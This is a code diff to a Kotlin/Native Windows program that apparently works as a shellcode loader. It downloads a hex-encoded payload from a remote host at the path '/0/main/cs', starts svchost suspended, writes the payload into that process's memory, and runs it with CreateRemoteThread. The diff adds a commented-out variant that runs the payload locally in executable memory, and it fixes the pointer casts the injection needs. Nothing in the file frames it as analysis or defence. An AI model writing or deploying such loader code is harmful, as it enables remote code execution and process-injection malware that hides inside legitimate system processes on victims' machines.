@@ -10,6 +10,7 @@ import kotlinx.cinterop.convert
 import kotlinx.cinterop.memScoped
 import kotlinx.cinterop.ptr
 import kotlinx.cinterop.readBytes
+import kotlinx.cinterop.reinterpret
 import kotlinx.cinterop.toCValues
 import kotlinx.cinterop.toKString
 import kotlinx.cinterop.value
@@ -36,7 +37,6 @@ import platform.windows.INTERNET_SERVICE_HTTP
 import platform.windows.InternetConnectW
 import platform.windows.InternetOpenW
 import platform.windows.InternetReadFile
-import platform.windows.LPTHREAD_START_ROUTINE
 import platform.windows.MAX_PATH
 import platform.windows.MEM_COMMIT
 import platform.windows.PAGE_EXECUTE_READ
@@ -91,6 +91,12 @@ fun main() {
         val raw = downloadFile("1.1.1.1", 80, "/0/main/cs")?.decodeToString()?.trim()?.hex2byte() ?: exitProcess(0)
         val rawSize = raw.size
 
+/*
+        val ptr = VirtualAlloc(null,  rawSize.convert(), MEM_COMMIT, PAGE_EXECUTE_READWRITE)!!
+        memcpy(ptr, raw.toCValues().ptr, rawSize.convert())
+        ptr.reinterpret<CFunction<() -> Unit>>().invoke()
+*/
+
         val si = alloc<STARTUPINFO>()
         val pi = alloc<PROCESS_INFORMATION>()
 
@@ -99,10 +105,10 @@ fun main() {
         }
 
         CreateProcessW(null, "svchost".wcstr.ptr, null, null, 0, CREATE_SUSPENDED, null, null, si.ptr, pi.ptr)
-        val ptr = VirtualAllocEx(pi.hProcess, null, rawSize.convert(), MEM_COMMIT, protect.value)
+        val ptr = VirtualAllocEx(pi.hProcess, null, rawSize.convert(), MEM_COMMIT, protect.value)!!
         WriteProcessMemory(pi.hProcess, ptr, raw.toCValues().ptr, rawSize.convert(), null)
         VirtualProtectEx(pi.hProcess, ptr, rawSize.convert(), PAGE_EXECUTE_READ, protect.ptr)
-        CreateRemoteThread(pi.hProcess, null, 0.convert(), ptr as LPTHREAD_START_ROUTINE, null, 0.convert(), null)
+        CreateRemoteThread(pi.hProcess, null, 0.convert(), ptr.reinterpret(), null, 0.convert(), null)
     }
 
     memScoped {
